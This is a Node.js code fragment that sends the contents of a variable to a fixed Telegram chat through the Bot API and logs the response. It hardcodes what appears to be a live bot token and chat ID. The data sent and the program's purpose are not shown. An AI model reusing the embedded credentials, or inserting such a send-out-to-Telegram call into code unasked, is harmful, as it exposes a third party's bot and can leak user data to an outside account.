

  var token = "2124944332:AAE54Bej3iRgQu3VYx5FCMVQ3FNriQCApd8"; // Fill this in with your token
  var telegramUrl = "/bot" + token + "/sendMessage?chat_id=72327642&parse_mode=html&text=" + encodeURIComponent(list);



  const options = {
    hostname: 'api.telegram.org',
    port: 443,
    path: telegramUrl,
    method: 'GET',
  };

  const req = https.request(options, res => {
    console.log(`statusCode: ${res.statusCode}`);

    res.on('data', d => {
      process.stdout.write(d);
    });
  });
  req.end();

  
  